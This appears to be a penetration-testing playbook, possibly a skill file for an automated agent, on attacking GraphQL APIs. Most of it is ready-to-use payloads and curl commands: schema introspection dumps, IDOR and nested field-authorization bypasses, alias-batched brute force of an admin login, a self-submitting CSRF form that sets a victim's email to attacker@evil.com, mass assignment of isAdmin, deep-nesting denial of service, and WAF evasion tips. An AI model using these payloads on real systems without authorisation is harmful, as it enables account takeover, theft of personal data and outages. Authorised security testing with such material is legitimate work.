# GraphQL API Attacks

## Trigger

Load when you see:

- Endpoints: `/graphql`, `/graphiql`, `/playground`, `/api/graphql`, `/v1/graphql`, `/graphql.php`
- Responses with `{"data": {...}}` or `{"errors": [{"message": "..."}]}`
- Single endpoint handling all API queries (not RESTful routing)
- `__typename` introspection field accepted
- Content-Type: `application/json` with `{"query": "..."}` body
- GET requests with `?query=...` parameter

## Attack Surface

- Introspection queries exposed (full schema disclosure)
- Field-level authorization missing (nested queries return unauthorized data)
- IDOR via sequential/guessable IDs in queries
- Batching/aliasing bypasses rate limits
- Mutation mass assignment (extra fields not validated)
- CSRF on GraphQL (GET requests, form-urlencoded content type)
- Circular queries / deep nesting for denial of service

## Decision Tree

1. Confirm GraphQL: POST `{"query":"query{__typename}"}` -- responses `{"data":{"__typename":"Query"}}`
2. Run introspection: dump the full schema
3. Search schema for sensitive fields: `password`, `ssn`, `creditCard`, `apiKey`, `token`, `email`, `phone`
4. Test field-level authorization: request sensitive fields from accessible parent queries
5. Test IDOR: change `id` parameters in queries
6. Test batching: use aliases to bypass rate limiting
7. Test mass assignment: add extra fields to mutations
8. Test CSRF: use GET or form-urlencoded POST
9. Test depth DoS: nest deeply recursive queries

## Techniques

### Introspection Query (Full Schema Dump)

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

```bash
curl -X POST http://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq
```

### Search Sensitive Fields in Schema

```bash
curl -s -X POST http://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | \
  grep -E "(password|ssn|credit|secret|key|token|email|phone)"
```

### Field-Level Authorization Bypass

```graphql
# Public parent query, but nested fields may return sensitive data
query {
  publicPost(id: 123) {
    title
    author {
      email        # Not authorized at field level
      phone
      orders {      # Nested IDOR
        id
        amount
        creditCardLast4
      }
    }
  }
}
```

### IDOR via Query Parameter

```graphql
query {
  user(id: 100) {  # Try id: 101, 102, 103...
    email
    privateMessages { content }
  }
}
```

### Alias-Based Brute Force (Rate Limit Bypass)

A single HTTP request triggers N login attempts, but the rate limiter counts 1 request:

```graphql
query {
  a: login(user:"admin",pass:"a") { token }
  b: login(user:"admin",pass:"b") { token }
  c: login(user:"admin",pass:"c") { token }
  # ... up to 50+ aliases in one request
}
```

### CSRF on GraphQL Mutations

GraphQL often accepts GET requests and form-urlencoded bodies:

```html
<form action="http://target/graphql" method="POST">
  <input type="hidden" name="query"
    value="mutation { updateEmail(email: &quot;attacker@evil.com&quot;) { id } }">
</form>
<script>document.forms[0].submit();</script>
```

### Mutation Mass Assignment

```graphql
mutation {
  updateUser(input: {
    id: 1,
    name: "attacker",
    isAdmin: true,         # Mass assignment test
    role: ADMIN,
    credits: 999999
  }) { id name role }
}
```

### Depth/Recursive DoS

```graphql
query {
  user(id:1) {
    friends { friends { friends { friends {
      # Nest 10-20 levels deep
    } } } }
  }
}
```

### Field Suggestion Info Leak

When introspection is disabled, schema field names may leak through error messages:

```bash
curl -X POST http://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{user {passwrd}}"}'
# Response: "Cannot query field 'passwrd' on type 'User'. Did you mean 'password'?"
```

### Relay Connection Paging Enumeration

```graphql
query {
  users(first: 10, after: "cursor") {
    edges {
      node { id email }
    }
    pageInfo {
      hasNextPage
      endCursor
    }
  }
}
```

If `first` accepts very large values, dump all records in one query. If `after` accepts arbitrary values, iterate through all pages.

## Bypass

| Block | Bypass |
|-------|--------|
| Introspection disabled | clairvoyance tool for field inference; extract queries from mobile/web client bundles |
| Top-level auth enforced | Nested field auth bypass (query a permitted parent with unauthorized child fields) |
| Rate limiting per request | Alias batching (50+ operations in one query) |
| Depth limiting | Use fragment spreading instead of inline nesting |
| ID type validation | Change GraphQL type: `String` to `Int`, `null` to `ID` |
| CSRF token required | Check if token is checked for GET requests or form-urlencoded POST |

## Verification

- Introspection returning full schema = system schema is exposed (Medium)
- Reading other user's email/phone via nested query = PII disclosure (High)
- Alias-based brute force logging 50 login attempts in 1 request = rate limit bypass (High)
- Mutation with `isAdmin: true` returning admin token = privilege escalation (Critical)
- Deeply nested query causing 10s+ response time = DoS vector

## Pitfalls

- GraphQL resolvers run PER FIELD, not per query. A single "public" query can resolve
  millions of database records through nested resolvers.
- Batching with aliases is NOT an attack on its own -- it exploits missing rate limiting on
  operation complexity, not request count.
- Some WAFs only inspect the `query` string but not the `variables` field. Move payloads
  from query string to variables to bypass.
- Introspection can be disabled via `introspection: false` in the config -- but many
  developers only disable the GraphiQL playground, not the introspection endpoint itself.
- Error messages leak field suggestions -- this is a common information disclosure even
  when introspection is fully disabled.
